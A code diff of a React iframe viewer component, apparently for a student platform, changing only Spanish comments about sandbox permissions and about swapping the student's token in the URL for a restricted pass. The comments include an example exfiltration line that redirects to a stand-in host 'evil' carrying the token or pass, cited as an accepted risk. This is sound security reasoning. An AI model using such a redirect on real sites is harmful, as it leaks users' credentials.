@@ -131,21 +131,21 @@ export function VisorEmbebido({ item, src, onVolver }: VisorEmbebidoProps) {
             //   SÍ necesita allow-scripts, a diferencia de "mirror". Lo que
             //   NO lleva, a propósito, es allow-same-origin: ese permiso
             //   junto con allow-scripts haría que el documento framed cuente
-            //   como si estuviera genuinamente en nuestro origen, y el `src`
-            //   del iframe lleva el token del alumno en la URL (igual que
-            //   "mirror", ver AlumnoView) — cualquier script de un tercero
-            //   que corra ahí (ads, analytics, un recurso cargado vía
-            //   /mirror/recurso) podría entonces llamar a la API real del
-            //   backend autenticado como ese alumno, sin que el navegador
-            //   aplique CORS. Con el origen opaco (sin allow-same-origin),
+            //   como si estuviera genuinamente en nuestro origen — cualquier
+            //   script de un tercero que corra ahí (ads, analytics, un
+            //   recurso cargado vía /mirror/recurso) podría entonces llamar a
+            //   la API real del backend sin que el navegador aplique CORS.
+            //   (La URL del iframe ya no lleva el token del alumno sino un
+            //   pase que solo abre sitios embebidos, ver AlumnoView.) Con el
+            //   origen opaco (sin allow-same-origin),
             //   ese fetch/XHR de vuelta a nuestro dominio real falla como
             //   cross-origin — el backend no manda headers CORS que lo
             //   permitan. Tampoco lleva allow-forms: el CSP que manda el
             //   backend para /mirror/pagina ya incluye form-action 'none',
             //   así que esa capacidad no haría nada real. (Esto no tapa el
             //   hueco ya aceptado de que un script igual podría navegar a
-            //   `location = 'https://evil/?t=' + token` para exfiltrar el
-            //   token — ver el resto del plan de RF-04 — solo cierra la
+            //   `location = 'https://evil/?p=' + pase` para exfiltrar el
+            //   pase — que solo abre sitios permitidos, no la API — solo cierra la
             //   capacidad nueva que introducía este sandbox: llamadas
             //   autenticadas de vuelta a nuestra propia API.)
             // - "proxy_sesion": el sitio real completo servido desde nuestro
